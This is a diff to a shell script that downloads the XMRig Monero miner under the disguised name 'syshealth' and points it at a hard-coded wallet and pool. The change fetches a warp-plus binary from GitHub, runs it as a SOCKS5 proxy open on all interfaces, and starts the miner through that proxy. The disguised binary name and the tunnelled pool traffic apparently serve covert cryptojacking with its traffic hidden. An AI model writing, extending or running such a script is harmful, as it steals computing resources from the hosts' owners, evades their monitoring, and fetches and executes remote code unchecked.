@@ -5,7 +5,6 @@ WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2
 POOL_URL="pool.supportxmr.com:443"
 WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
 
-set -e
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # Download miner if needed
@@ -17,29 +16,43 @@ if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
   rm -rf /tmp/xmrig-*
 fi
 
-# Install warp using warp-yg script
-echo "Installing Cloudflare WARP..."
+# Download warp-go directly (doesn't need root)
+echo "Downloading Cloudflare WARP-GO..."
 cd "$SCRIPT_DIR"
-curl -sSL https://raw.githubusercontent.com/yonggekkk/warp-yg/main/CFwarp.sh -o CFwarp.sh
-chmod +x CFwarp.sh
 
-# Run warp-go installation (option 1 in the script)
-# This will install warp-go and start SOCKS5 proxy on port 40000
-echo "1" | bash CFwarp.sh 2>&1 | tee warp-install.log
+# Get latest warp-go binary
+ARCH="amd64"
+if [ "$(uname -m)" = "aarch64" ]; then
+  ARCH="arm64"
+fi
 
-# Wait for WARP to start
+# Download from GitHub releases
+WARP_VERSION="1.2.0"
+curl -sL "https://github.com/bepass-org/warp-plus/releases/download/v${WARP_VERSION}/warp-plus_linux-${ARCH}" -o warp-plus
+chmod +x warp-plus
+
+# Start WARP SOCKS5 proxy
+echo "Starting Cloudflare WARP..."
+./warp-plus --bind 0.0.0.0:40000 &
+WARP_PID=$!
 sleep 20
 
-# Check if WARP proxy is working
-if ! curl --socks5 127.0.0.1:40000 -m 5 https://api.ipify.org 2>/dev/null; then
-  echo "ERROR: WARP SOCKS5 proxy not working"
-  tail -50 warp-install.log
+# Check if WARP is running
+if ! kill -0 $WARP_PID 2>/dev/null; then
+  echo "ERROR: WARP failed to start"
+  ps aux | grep warp
   exit 1
 fi
 
-echo "WARP connected! SOCKS5 proxy at 127.0.0.1:40000"
-curl --socks5 127.0.0.1:40000 https://api.ipify.org
-echo ""
+# Test WARP connection
+echo "Testing WARP connection..."
+if curl --socks5 127.0.0.1:40000 -m 10 https://api.ipify.org 2>/dev/null; then
+  echo "✓ WARP connected successfully!"
+else
+  echo "ERROR: WARP SOCKS5 proxy not responding"
+  kill $WARP_PID 2>/dev/null
+  exit 1
+fi
 
 # Start miner with SOCKS5 proxy
 echo "Starting XMRig with WARP..."
